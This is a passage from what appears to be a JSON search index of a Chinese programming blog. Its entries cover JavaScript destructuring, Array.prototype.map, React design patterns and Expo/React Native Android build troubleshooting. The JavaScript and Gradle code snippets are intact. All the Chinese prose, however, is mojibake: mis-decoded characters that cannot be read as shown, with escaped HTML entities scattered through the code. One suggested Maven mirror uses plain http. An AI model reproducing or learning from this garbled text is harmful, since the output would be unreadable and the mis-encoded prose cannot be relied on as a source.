\u0026#39;cherry\u0026#39;}; const fruitKey = \u0026#39;banana\u0026#39;; const {[fruitKey]:fruitOfChoice} = fruits; console.log(fruitOfChoice); // banana   9. è§£æ„å‡½æ•°å‚æ•° 1 2 3 4  const getCherry = ({banana, cherry}) =\u0026gt; console.log(cherry); const fruits = {banana: \u0026#39;banana\u0026#39;, cherry: \u0026#39;cherry\u0026#39;}; getCherry(fruits); // cherry   ","description":"å¼ºå¤§çš„JavaScriptè§£æ„æŠ€æœ¯","id":36,"section":"javascript","tags":null,"title":"è§£æ„èµ‹å€¼","uri":"https://codthing.github.io/javascript/array/jiegou/"},{"content":"æ³¨æ„ï¼šèœå•é¡¹ç›®ä¸­ï¼ˆXï¼‰çš„éƒ½ä¸ºè¿‡æ—¶æˆ–è€…ä¸å»ºè®®ä½¿ç”¨çš„æ¨¡å¼ï¼Œä¾ç„¶å†™å‡ºæ¥åªæ˜¯ä¸ºäº†è®©æˆ‘ä»¬äº†è§£å†å²\nè®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘çš„åŸºæœ¬éƒ¨åˆ†ï¼Œ\nå› ä¸ºå®ƒä»¬ä¸ºè½¯ä»¶è®¾è®¡ä¸­ç»å¸¸å‡ºç°çš„é—®é¢˜æä¾›äº†å…¸å‹çš„è§£å†³æ–¹æ¡ˆã€‚\nè®¾è®¡æ¨¡å¼ä¸æ˜¯æä¾›ç‰¹å®šçš„è½¯ä»¶éƒ¨åˆ†ï¼Œè€Œæ˜¯å¯ä»¥ç”¨æ¥ä»¥ä¼˜åŒ–çš„æ–¹å¼å¤„ç†é‡å¤å‡ºç°çš„ä¸»é¢˜çš„æ¦‚å¿µã€‚\nåœ¨è¿‡å»çš„å‡ å¹´é‡Œï¼ŒWeb å¼€å‘ç”Ÿæ€ç³»ç»Ÿå‘ç”Ÿäº†è¿…é€Ÿçš„å˜åŒ–ã€‚\nè™½ç„¶ä¸€äº›ä¼—æ‰€å‘¨çŸ¥çš„è®¾è®¡æ¨¡å¼å¯èƒ½æ ¹æœ¬ä¸åƒè¿‡å»é‚£æ ·æœ‰ä»·å€¼ï¼Œä½†å…¶ä»–è®¾è®¡æ¨¡å¼å·²ç»æ¼”å˜ä¸ºä½¿ç”¨æœ€æ–°æŠ€æœ¯è§£å†³ç°ä»£é—®é¢˜ã€‚\nFacebook çš„ JavaScript åº“ React åœ¨è¿‡å» 5 å¹´ä¸­è·å¾—äº†å·¨å¤§çš„å¸å¼•åŠ›ï¼Œä¸Angularã€Vueã€Emberå’ŒSvelteç­‰ç«äº‰æ€§ JavaScript åº“ç›¸æ¯”ï¼Œå®ƒæ˜¯ç›®å‰NPM ä¸Šä¸‹è½½é¢‘ç‡æœ€é«˜çš„æ¡†æ¶ã€‚\nç”±äº React çš„æµè¡Œï¼Œè®¾è®¡æ¨¡å¼å·²è¢«ä¿®æ”¹ã€ä¼˜åŒ–å¹¶åˆ›å»ºäº†æ–°çš„æ¨¡å¼ï¼Œä»¥ä¾¿åœ¨å½“å‰çš„ç°ä»£ Web å¼€å‘ç”Ÿæ€ç³»ç»Ÿä¸­æä¾›ä»·å€¼ã€‚\næœ€æ–°ç‰ˆæœ¬çš„ React å¼•å…¥äº†ä¸€ä¸ªåä¸ºHooksçš„æ–°åŠŸèƒ½ï¼Œå®ƒåœ¨æ‚¨çš„åº”ç”¨ç¨‹åºè®¾è®¡ä¸­æ‰®æ¼”ç€éå¸¸é‡è¦çš„è§’è‰²ï¼Œå¯ä»¥æ›¿ä»£è®¸å¤šä¼ ç»Ÿçš„è®¾è®¡æ¨¡å¼ã€‚\nç°ä»£ Web å¼€å‘æ¶‰åŠè®¸å¤šä¸åŒç±»å‹çš„æ¨¡å¼ã€‚\nä½¿ç”¨ ES2015+ çš„å¸¸è§è®¾è®¡æ¨¡å¼çš„å®ç°ã€ä¼˜ç‚¹å’Œé™·é˜±ã€ç‰¹å®šäº React çš„è®¾è®¡æ¨¡å¼åŠå…¶ä½¿ç”¨ React Hooks çš„å¯èƒ½ä¿®æ”¹å’Œå®ç°ï¼Œä»¥åŠæ›´å¤šæœ‰åŠ©äºæ”¹è¿›ç°ä»£ Web åº”ç”¨ç¨‹åºçš„æ¨¡å¼å’Œä¼˜åŒ–ï¼\n","description":"è®¾è®¡æ¨¡å¼æ˜¯è½¯ä»¶å¼€å‘çš„åŸºæœ¬éƒ¨åˆ†ï¼Œå› ä¸ºå®ƒä»¬ä¸ºè½¯ä»¶è®¾è®¡ä¸­ç»å¸¸å‡ºç°çš„é—®é¢˜æä¾›äº†å…¸å‹çš„è§£å†³æ–¹æ¡ˆã€‚è®¾è®¡æ¨¡å¼ä¸æ˜¯æä¾›ç‰¹å®šçš„è½¯ä»¶éƒ¨åˆ†ï¼Œè€Œæ˜¯å¯ä»¥ç”¨æ¥ä»¥ä¼˜åŒ–çš„æ–¹å¼å¤„ç†é‡å¤å‡ºç°çš„ä¸»é¢˜çš„æ¦‚å¿µã€‚","id":37,"section":"react-patterns","tags":null,"title":"è®¾è®¡æ¨¡å¼ä»‹ç»","uri":"https://codthing.github.io/react-patterns/design-patterns/design-patterns/"},{"content":"map() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ä¸­å¡«å……äº†å¯¹è°ƒç”¨æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨æä¾›çš„å‡½æ•°çš„ç»“æœã€‚\nä½¿ç”¨ map æ–¹æ³•ä»æ•°ç»„ä¸­æå–æ•°æ® ç›®å‰ä¸ºæ­¢ï¼Œå·²ç»ä½¿ç”¨çº¯å‡½æ•°æ¥é¿å…ç¨‹åºä¸­çš„å‰¯ä½œç”¨ã€‚ æ­¤å¤–ï¼Œå·²ç»çœ‹åˆ°å‡½æ•°çš„å€¼ä»…å–å†³äºå…¶è¾“å…¥å‚æ•°ã€‚\nè¿™ä»…ä»…æ˜¯ä¸ªå¼€å§‹ã€‚ é¡¾åæ€ä¹‰ï¼Œå‡½æ•°å¼ç¼–ç¨‹ä»¥å‡½æ•°ç†è®ºä¸ºä¸­å¿ƒã€‚\nèƒ½å¤Ÿå°†å®ƒä»¬ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–å‡½æ•°ï¼Œä»å¦ä¸€ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªå‡½æ•°æ˜¯æœ‰æ„ä¹‰çš„ã€‚\nå‡½æ•°åœ¨ JavaScript ä¸­è¢«è§†ä¸º First Class Objectsï¼Œå®ƒä»¬å¯ä»¥åƒä»»ä½•å…¶ä»–å¯¹è±¡ä¸€æ ·ä½¿ç”¨ã€‚ å®ƒä»¬å¯ä»¥ä¿å­˜åœ¨å˜é‡ä¸­ï¼Œå­˜å‚¨åœ¨å¯¹è±¡ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå‡½æ•°å‚æ•°ä¼ é€’ã€‚\nä»ä¸€äº›ç®€å•çš„æ•°ç»„å‡½æ•°å¼€å§‹ï¼Œè¿™äº›å‡½æ•°æ˜¯æ•°ç»„å¯¹è±¡åŸå‹ä¸Šçš„æ–¹æ³•ã€‚\næ•°ç»„çš„ map æ–¹æ³•ï¼ˆå³ Array.prototype.map()ï¼‰ã€‚\nè¯·è®°ä½ï¼Œmapæ–¹æ³•æ˜¯è¿­ä»£æ•°ç»„ä¸­æ¯ä¸€é¡¹çš„æ–¹å¼ä¹‹ä¸€ã€‚ åœ¨å¯¹æ¯ä¸ªå…ƒç´ åº”ç”¨å›è°ƒå‡½æ•°åï¼Œå®ƒä¼šåˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„(ä¸æ”¹å˜åŸæ¥çš„æ•°ç»„)ã€‚ å®ƒè¿™æ ·åšæ—¶æ²¡æœ‰æ”¹å˜åŸå§‹æ•°ç»„ã€‚\nå½“è°ƒç”¨å›è°ƒå‡½æ•°æ—¶ï¼Œä¼ å…¥äº†ä¸‰ä¸ªå‚æ•°ã€‚ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å½“å‰æ­£åœ¨å¤„ç†çš„æ•°ç»„é¡¹ã€‚ ç¬¬äºŒä¸ªå‚æ•°æ˜¯å½“å‰æ•°ç»„é¡¹çš„ç´¢å¼•å€¼ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯åœ¨å…¶ä¸Šè°ƒç”¨ map æ–¹æ³•çš„æ•°ç»„ã€‚\nç®€å•çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const names = users.map(user =\u0026gt; user.name); console.log(names); // [ \u0026#39;John\u0026#39;, \u0026#39;Amy\u0026#39;, \u0026#39;camperCat\u0026#39; ]   å¤æ‚çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // å…¨å±€å˜é‡ const watchList = [ { \u0026#34;Title\u0026#34;: \u0026#34;Inception\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2010\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.8\u0026#34;, }, { \u0026#34;Title\u0026#34;: \u0026#34;Interstellar\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2014\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.6\u0026#34;, } ]; const ratings = watchList.map(({ Title: title, imdbRating: rating }) =\u0026gt; ({title, rating})); console.log(JSON.stringify(ratings)); // [{\u0026#34;title\u0026#34;:\u0026#34;Inception\u0026#34;,\u0026#34;rating\u0026#34;:\u0026#34;8.8\u0026#34;},{\u0026#34;title\u0026#34;:\u0026#34;Interstellar\u0026#34;,\u0026#34;rating\u0026#34;:\u0026#34;8.6\u0026#34;}]   \råœ¨åŸå‹ä¸Šå®ç° map æ–¹æ³• Array.prototype.map() æ–¹æ³•ï¼ˆå³ map()ï¼‰ï¼Œé€šè¿‡ map è¿”å›ä¸€ä¸ªä¸è°ƒç”¨å®ƒçš„æ•°ç»„é•¿åº¦ç›¸åŒçš„æ•°ç»„ã€‚\nåªè¦å®ƒçš„å›è°ƒå‡½æ•°ä¸æ”¹å˜åŸå§‹æ•°ç»„ï¼Œå®ƒå°±ä¸ä¼šæ”¹å˜åŸå§‹æ•°ç»„ã€‚\næ¢å¥è¯è¯´ï¼Œmap æ˜¯ä¸€ä¸ªçº¯å‡½æ•°ï¼Œå®ƒçš„è¾“å‡ºä»…å–å†³äºè¾“å…¥çš„æ•°ç»„å’Œä½œä¸ºå‚æ•°ä¼ å…¥çš„å›è°ƒå‡½æ•°ã€‚ æ­¤å¤–ï¼Œå®ƒæ¥æ”¶å¦ä¸€ä¸ªå‡½æ•°ä½œä¸ºå®ƒçš„å‚æ•°ã€‚\nå®ç°ä¸€ä¸ª mapï¼ŒåŠ æ·±å¯¹å®ƒçš„äº†è§£ã€‚ å¯ä»¥ç”¨ for å¾ªç¯æˆ–è€… Array.prototype.forEach() æ–¹æ³•ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // å…¨å±€å˜é‡ const s = [23, 65, 98, 5]; Array.prototype.myMap = function (callback) { const newArray = []; for (let i = 0; i \u0026lt; this.length; i++) { newArray.push(callback(this[i])); } // æˆ–è€… this.forEach(a =\u0026gt; newArray.push(callback(a)));  return newArray; }; const new_s = s.myMap(function (item) { return item * 2; }); console.log(new_s); // [ 46, 130, 196, 10 ]   ","description":"map() æ–¹æ³•åˆ›å»ºä¸€ä¸ªæ–°æ•°ç»„ï¼Œå…¶ä¸­å¡«å……äº†å¯¹è°ƒç”¨æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ è°ƒç”¨æä¾›çš„å‡½æ•°çš„ç»“æœã€‚","id":38,"section":"javascript","tags":null,"title":"Array.prototype.map()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/map-programming/"},{"content":"ä¸€ã€åˆ›å»ºé¡¹ç›® expo init MyProject åˆ›å»ºé¡¹ç›®ï¼Œé€‰æ‹©æ‰˜ç®¡å·¥ä½œæµçš„TypeScriptçš„ç©ºç™½æ¨¡æ¿ï¼Œç„¶åç”¨ expo eject é€€å‡ºåˆ°è£¸æ¼å·¥ä½œæµã€‚\nä¹‹æ‰€ä»¥é€‰æ‹©è¿™ç§æ–¹å¼åˆ›å»ºé¡¹ç›®ï¼Œæ˜¯å› ä¸ºçµæ´»æ€§å¾ˆå¤§ï¼Œå¯ä»¥åœ¨æ‰˜ç®¡å’Œè£¸æ¼ä¹‹é—´åšå¼€å‘ï¼ˆandroid\u0026amp;ios/androidï¼‰ã€‚\nå› ä¸ºå¾ˆå¤šåº“æ˜¯ä¾èµ–è£¸æ¼å·¥ä½œæµå¼€å‘çš„ä¸”æ‰“åŒ…android apkçš„æ—¶å€™å¯ä»¥å‡å°‘sizeï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨Expoå¼€å‘çš„åº“è€ŒèŠ‚çœäº†æ‰‹åŠ¨é…ç½®çš„æ—¶é—´ã€‚\nç‰¹åˆ«æ³¨æ„ï¼šåœ¨é€€å‡ºä¹‹å‰ï¼Œå¿…é¡»å…ˆexpo loginç™»å½•ï¼Œå¦åˆ™åœ¨æ„å»ºçš„æ—¶å€™ä¼šæŠ¥é”™ï¼›åœ¨app.jsonä¸­å°†åŸºç¡€çš„é…ç½®é…ç½®å¥½ï¼Œæ¯”å¦‚å±å¹•æ–¹å‘è®¾ç½®ä¸º â€˜defaultâ€™ï¼ŒèƒŒæ™¯è‰²è®¾ç½®ä¸º â€˜#00000088â€™ ç­‰ã€‚å…å»ä¹‹åæ‰‹åŠ¨é…ç½®çš„æ­¥éª¤ã€‚\nandroid package name çš„å‘½åæ–¹å¼ï¼šhttps://developer.android.com/studio/build/application-id\näºŒã€ä»æ‰˜ç®¡managedå·¥ä½œæµä¸­é€€å‡ºåˆ°è£¸æ¼bareå·¥ä½œæµ  Step1. é€€å‡º\n expo eject  Step2. åœ¨é¡¹ç›®æ ¹ç›®å½•æ‰§è¡Œä¸‹è½½å¯†é’¥\n expo fetch:android:keystore  Step3.å°†å‘½ä»¤è¡Œçª—å£ä¸­çš„å¯†é’¥å¤åˆ¶ä¿å­˜åˆ° temporary_dev_files/build_apk_key ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­,ä¾¿äºä¹‹åæ‰“åŒ…apkä½¿ç”¨\n ä¸‰ã€æŸ¥çœ‹é¡¹ç›®ç¯å¢ƒä¿¡æ¯  Expo/RNé¡¹ç›®æ ¹ç›®å½•ä¸‹å¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤\n react-native info  Expoé¡¹ç›®æ ¹ç›®å½•ä¸‹ä¹Ÿå¯æ‰§è¡Œ\n expo diagnostics å››ã€é¡¹ç›®æ ¹ç›®å½•æœ€å¥½æ–°å»ºä¸€ä¸ª temporary_dev_files ä¸´æ—¶å¼€å‘æ–‡ä»¶å¤¹ï¼Œä¾¿äºç®¡ç†è®¸å¤šå¼€å‘é˜¶æ®µä¸´æ—¶å­˜æ”¾çš„æ–‡ä»¶ äº”ã€å…³äºä¿®æ”¹node_modulesè½¯ä»¶åŒ…çš„äº‹å®œ æœ‰æ—¶å€™å®‰è£…çš„è½¯ä»¶åŒ…ä¸ç¬¦åˆè‡ªå·±çš„è¦æ±‚æˆ–è€…å­˜åœ¨bugï¼Œéœ€è¦è‡ªå·±ä¿®æ”¹è½¯ä»¶åŒ…æºä»£ç ï¼Œè¿›å…¥åˆ°node_modulesä¸­æ‰¾åˆ°ç›¸å…³çš„è½¯ä»¶åŒ…æºç è¿›è¡Œä¿®æ”¹ã€‚\nåœ¨ä¸å½±å“å¼€å‘çš„æƒ…å†µä¸‹ï¼Œæœ€çœäº‹çš„åšæ³•æ˜¯ï¼Œå°†ä¿®æ”¹å¥½çš„ä»£ç å¤åˆ¶ä¸€ä»½ä¿å­˜åˆ° temporary_dev_files/modules (æ³¨æ„ä¸è¦å‘½åä¸ºnode_modulesï¼Œå› ä¸ºgithubä¸ä¼šæäº¤) ä¸´æ—¶æ–‡ä»¶å¤¹ï¼Œé¡¹ç›®ä¼šè‡ªåŠ¨è¯»å–modulesçš„ä¿®æ”¹æ–‡ä»¶ã€‚\nå…­ã€.d.ts æ–‡ä»¶ å¾ˆå¤šæ—¶å€™ï¼Œå¾ˆå¤šåº“éƒ½æ²¡æœ‰ç›´æ¥å®‰è£…çš„TypeScriptç‰ˆæœ¬ï¼Œä½†æ˜¯å¾€å¾€å¸¦æœ‰ index.d.ts æ–‡ä»¶ã€‚\nå¯ä»¥å°†å®ƒæ”¾ç½®åˆ° no_modules/å¯¹åº”çš„è½¯ä»¶åŒ…æ ¹ç›®å½•ä¸­ï¼Œå°±å¯ä»¥ç”Ÿæ•ˆäº†ï¼Œå½“ç„¶ï¼Œä¹Ÿå¯åœ¨é¡¹ç›®æ ¹ç›®å½•æ–°å»ºä¸€ä¸ªd.tsæ–‡ä»¶å¤¹ï¼Œé‡Œé¢å¯ä»¥æ”¾ç½®å„ç§åº“çš„d.tsæ–‡ä»¶ã€‚\nä¹Ÿå¯ä»¥æ›´çœäº‹åœ¨é¡¹ç›®æ ¹ç›®å½•æ–°å»ºtype.d.ts\næˆ–è€…\næˆ–è€…ï¼ˆæ¨èï¼‰\né¡¹ç›®æ ¹ç›®å½•æ–°å»º type.d.ts\ndeclare module \u0026#39;react-native-static-server\u0026#39;\rdeclare module \u0026#39;react-native-fs\u0026#39; ä¸ƒã€å…³äºexpoå¯åŠ¨å›¾ç‰‡ä¸æ˜¾ç¤ºå’Œè£¸æ¼å·¥ä½œæµæ‰“åŒ…å¤±è´¥çš„é—®é¢˜ expo sdk40 å¯åŠ¨å›¾ç‰‡ä¸æ˜¾ç¤ºï¼Œè¿å®˜æ–¹éƒ½ç»™ä¸åˆ°ç­”æ¡ˆã€‚github issues\nåŒæ—¶ï¼Œè£¸æ¼å·¥ä½œæµæ‰“åŒ…å¤±è´¥ã€‚è£¸æ¼å·¥ä½œæµå’Œæ‰˜ç®¡å·¥ä½œæµæ‰“åŒ…å‡ºæ¥çš„apkéƒ½ä¸æ˜¾ç¤ºå›¾åƒã€‚\né—®é¢˜åˆ†æï¼Œæœ¬åœ°java sdkå’Œæ‰˜ç®¡æœåŠ¡å™¨java sdkæ²¡æœ‰å‡çº§ã€‚\nè§£å†³åŠæ³•ï¼š\nå‡çº§java8åˆ°æœ€æ–°ç‰ˆæœ¬å°±å¯ä»¥è§£å†³äº†ã€‚\nä»8u271 å‡çº§åˆ° 8u281 ã€‚\nè£¸æ¼å·¥ä½œæµä¸­æ‰“åŒ…æ²¡æœ‰é—®é¢˜äº†ï¼ŒåŒæ—¶apkå¯åŠ¨å›¾åƒä¹Ÿå¯ä»¥æ˜¾ç¤ºäº†ã€‚\nè‡³äºæ‰˜ç®¡å·¥ä½œæµï¼Œç”±äºæœåŠ¡å™¨åœ¨Expoï¼Œè¦ç­‰åˆ°ä»–ä»¬å‡çº§äº†ä¼°è®¡æ‰èƒ½æ­£å¸¸æ˜¾ç¤ºå›¾ç‰‡ã€‚\nå…«ã€æ‰“åŒ…apkçš„å°ºå¯¸å’Œæ€§èƒ½æå‡ ç”¨è£¸æ¼å·¥ä½œæµæ‰“åŒ…è¦æ¯”æ‰˜ç®¡å·¥ä½œæµå°ºå¯¸è¦å°ä¸å°‘ï¼Œè¿™å¯¹äºå¯¹ä½“ç§¯æœ‰è¦æ±‚çš„é¡¹ç›®æ˜¯ä¸ªé€‰æ‹©ã€‚\nå‹ç¼©åŠä¼˜åŒ–apkåŒ… \u0026ndash;å¯ç”¨Hermesçˆ±é©¬ä»• + æ„å»ºä¸åŒæ¶æ„çš„apk\nå›¾ç‰‡ä¼šå¯¹æ€§èƒ½æœ‰å¾ˆå¤§çš„å½±å“ï¼ˆcpuå’Œå†…å­˜ç­‰å³°å€¼ï¼‰ï¼Œå»ºè®®ä½¿ç”¨webpæ ¼å¼çš„å›¾åƒ\n// Step1. android/app/build.gradle\rproject.ext.react = [\rentryFile: \u0026#34;index.js\u0026#34;,\r- enableHermes: false // clean and rebuild if changing\r+ enableHermes: true // clean and rebuild if changing\r]\r- def enableHermes = project.ext.react.get(\u0026#34;enableHermes\u0026#34;, false);\r+ def enableHermes = project.ext.react.get(\u0026#34;enableHermes\u0026#34;, true);\r- def enableSeparateBuildPerCPUArchitecture = false\r+ def enableSeparateBuildPerCPUArchitecture = true\r// Step2. æ¸…ç†æ„å»º\rcd android \u0026amp;\u0026amp; ./gradlew clean\r// Step3. é‡æ–°æ„å»º\rgradlew assembleRelease ä¹ã€è£¸æ¼å·¥ä½œæµæ‰“åŒ…apkåï¼Œgithubä¸Šä¼ æ–‡ä»¶è¿‡å¤§ ç”±äºæ‰“åŒ…åçš„androidä»£ç å¢åŠ äº†ä¸€ä¸ª.hprofå’Œä¸€ä¸ª BasePackageList.java å¤§æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨ä¸Šä¼ åˆ°githubçš„æ—¶å€™æ–‡ä»¶è¶…å¤§äº†ï¼Œç”±äºexpoç”¨expo ejecté€€å‡ºåˆ°è£¸æ¼å·¥ä½œæµçš„æ—¶å€™æ²¡æœ‰è‡ªåŠ¨ç”Ÿæˆå¯¹.hprofå’ŒBasePackageList.javaçš„é™åˆ¶æ–°.gitignoreæ–‡ä»¶ï¼Œæ‰€ä»¥è¦æ‰‹åŠ¨è‡ªå·±æ·»åŠ è¿›å»ã€‚æœ€çœäº‹å°±æ˜¯å»åˆ°Expoçš„githubæ ¹ç›®å½•æ‹¿ç°æˆçš„æ¥ç”¨ https://github.com/expo/expo/blob/master/.gitignore\nåã€gradlew clean yarn android è¿‡ç¨‹ä¸­ï¼ŒæŠ¥Task :app:processDebugResources FAILED ç­‰ç­‰é”™è¯¯ã€‚\n Step1. android æ–‡ä»¶å¤¹ä¸­ æ‰§è¡Œæ¸…ç†æ„å»º\n gradlew clean  Step2. ç„¶åå†è¿”å›é¡¹ç›®æ ¹ç›®å½• æ‰§è¡Œ\n yarn android åä¸€ã€Could not download groovy-all-2.4.15.jar  ç”±äºä¸­å›½å…±äº§å…šé‚ªæ•™çš„åŸå› \n * What went wrong:\rCould not determine the dependencies of task \u0026#39;:app:lintVitalRelease\u0026#39;.\r\u0026gt; Could not resolve all artifacts for configuration \u0026#39;:app:debugCompileClasspath\u0026#39;.\r\u0026gt; Could not download groovy-all-2.4.15.jar (org.codehaus.groovy:groovy-all:2.4.15)\r\u0026gt; Could not get resource \u0026#39;https://jcenter.bintray.com/org/codehaus/groovy/groovy-all/2.4.15/groovy-all-2.4.15.jar\u0026#39;.\r\u0026gt; Could not GET \u0026#39;https://jcenter.bintray.com/org/codehaus/groovy/groovy-all/2.4.15/groovy-all-2.4.15.jar\u0026#39;.\r\u0026gt; Remote host terminated the handshake  è§£å†³åŠæ³•\n  Step1. android/build.gradle\n repositories {\r- google()\r- jcenter()\r//ç”¨é˜¿é‡Œé•œåƒæ›¿æ¢\r+ maven { url \u0026#39;https://maven.aliyun.com/repository/google\u0026#39;}\r+ maven { url \u0026#39;https://maven.aliyun.com/repository/jcenter\u0026#39;}\r+ maven { url \u0026#39;http://maven.aliyun.com/nexus/content/groups/public\u0026#39;}\r}  Step2. ç„¶åå†æ‰“åŒ…apk\n gradlew assembleRelease åäºŒã€æ·±å±‚é“¾æ¥ DeepLink + android backbutton å®‰å“è¿”å›é”® ä¾‹å­  åœ¨ /android/app/src/main/AndroidManifest.xml ä¸­é…ç½® scheme è®¿é—®å‰ç¼€\n \u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026#34;android.intent.action.VIEW\u0026#34;/\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt;\r\u0026lt;category android:name=\u0026#34;android.intent.category.BROWSABLE\u0026#34;/\u0026gt;\r\u0026lt;data android:scheme=\u0026#34;myapp\u0026#34;/\u0026gt;\r\u0026lt;data android:scheme=\u0026#34;com.notbrent.mofengfs\u0026#34;/\u0026gt;\r\u0026lt;data android:scheme=\u0026#34;a08\u0026#34;/\u0026gt;\r\u0026lt;/intent-filter\u0026gt;  é…ç½®æ·±å±‚é“¾æ¥\n import * as Linking from \u0026#39;expo-linking\u0026#39;;\rexport default {\rprefixes: [\u0026#39;a08://\u0026#39;],\rconfig: {\rscreens: {\rRoot: {\rscreens: {\rTabOne: {\rscreens: {\rTabOneScreen: \u0026#39;one\u0026#39;,\r},\r},\rTabTwo: {\rscreens: {\rTabTwoScreen: \u0026#39;two\u0026#39;,\r},\r},\r},\r},\r// NotFound: \u0026#39;*\u0026#39;,\rList: {\rpath: \u0026#39;list/:id\u0026#39;,\rparse: {\rid: (id: any) =\u0026gt; `${id}`\r}\r},\rDetail: {\rpath: \u0026#39;detail/:id\u0026#39;,\rparse: {\rid: (id: any) =\u0026gt; `${id}`\r}\r}\r}\r},\r};  NavigationContainer ä¸­è°ƒç”¨æ·±å±‚é“¾æ¥\n \u0026lt;NavigationContainer\rlinking={LinkingConfiguration}\rtheme={colorScheme === \u0026#39;dark\u0026#39; ? DarkTheme : DefaultTheme}\u0026gt;\r\u0026lt;RootNavigator /\u0026gt;\r\u0026lt;/NavigationContainer\u0026gt;  android backbutton ä¸èƒ½è¿”å›ä¸Šä¸€é¡µçš„è§£å†³åŠæ³•\næ¯ä¸ªéé¦–é¡µå±å¹•éƒ½è¦æ·»åŠ goBackä»£ç \n import { BackHandler } from \u0026#39;react-native\u0026#39;;\rexport const listScreen = ({ navigation: { goBack } }) =\u0026gt; {\r// è¿”å›ä¸Šä¸€å± start\rfunction handleBackButtonClick() {\rgoBack();\rreturn true;\r}\ruseEffect(() =\u0026gt; {\rBackHandler.addEventListener(\u0026#39;hardwareBackPress\u0026#39;, handleBackButtonClick);\rreturn () =\u0026gt; {\rBackHandler.removeEventListener(\u0026#39;hardwareBackPress\u0026#39;, handleBackButtonClick);\r};\r}, []);\r// è¿”å›ä¸Šä¸€å± end\r...\r...  å”¤é†’æ·±å±‚é“¾æ¥ï¼Œæ‰§è¡Œä¾‹å¦‚ï¼š\n npx uri-scheme open a08://detail/123 --android å®Œæ•´ä¾‹å­ï¼šhttps://github.com/mofengfs/DeepLink-BackHandler-Example\nåä¸‰ã€å¯åŠ¨å±å¹•ç™½é—ªè§£å†³ ä½¿ç”¨ react navigation v5å’Œ eva ä¸»é¢˜ï¼Œ åœ¨ NavigationContainer ä¸­é…ç½®æ·±è‰²ä¸»é¢˜å³å¯\n Step1.\n import { NavigationContainer, DarkTheme, DefaultTheme } from \u0026#39;@react-navigation/native\u0026#39;; import * as eva from \u0026#39;@eva-design/eva\u0026#39;;  Step2.\n const navigationTheme = eva.dark ? DarkTheme : DefaultTheme;  Step3.\n \u0026lt;NavigationContainer theme={navigationTheme} linking={deepLinking}\u0026gt;\r\u0026lt;MainStack /\u0026gt;\r\u0026lt;/NavigationContainer\u0026gt; åå››ã€worker cmd å‡æ­»çŠ¶æ€ æœ‰æ—¶å€™æ‰“å°æ²¡æœ‰å³æ—¶æ˜¾ç¤ºï¼Œå¯ä»¥å°è¯•æ•²å›è½¦é”®\nåäº”ã€error: Android project not found. Are you sure this is a React Native project? å¾ˆå¯èƒ½æ˜¯ä¸¢å¤±äº†./android/app/src/main/AndroidManifest.xmlæ–‡ä»¶\nåå…­ã€Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0  ./android/build.gradle\n - classpath(\u0026#34;com.android.tools.build:gradle:3.5.3\u0026#34;)\r+ classpath(\u0026#34;com.android.tools.build:gradle:3.5.4\u0026#34;) åä¸ƒã€æ–‡ä»¶æ›´æ–°ï¼Œæ ‡è®° ä»»æ„èƒ½æŒä¹…ä¿å­˜æ•°æ®çš„åœ°æ–¹/æ–¹å¼éƒ½å¯ä»¥åšç‰ˆæœ¬æ ‡è®°ï¼Œæ€»ä¹‹å°±æ˜¯è®©ç¨‹åºè‡ªå·±çŸ¥é“å“ªäº›é€»è¾‘æ‰§è¡Œè¿‡äº†ï¼Œå“ªäº›éœ€è¦æ‰§è¡Œï¼Œæ‰§è¡Œå®Œäº†åšæ ‡è®°ï¼Œä¸ç®¡å•¥è¿ç§»éƒ½æ˜¯è¿™ä¹ˆä¸ªæµç¨‹\né€šè¿‡æ‹‰å»æœåŠ¡å™¨è¿”å›çš„ç‰ˆæœ¬å·ä¸æœ¬åœ°æ•°æ®åº“ä¿å­˜çš„ç‰ˆæœ¬å·åšå¯¹æ¯”ï¼Œåˆ¤æ–­æ˜¯å¦åº”è¯¥æ‰§è¡Œæ–‡ä»¶çš„æ›´æ–°æ“ä½œã€‚\næ³¨æ„ï¼šå‹ç¼©æ–‡ä»¶å¿…é¡»æ˜¯èƒ½å¤Ÿç›´æ¥è§£å‹ä¸å¸¦æ ¹æ–‡ä»¶å¤¹åç§°ï¼Œå‹ç¼©çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œæ“ä½œå¦‚ä¸‹ï¼š å…¨é€‰æ·»åŠ åˆ° www.zip æ“ä½œ\nåå…«ã€UIæ–¹å‘ é»˜è®¤UIæ¨ªå‘ã€‚ 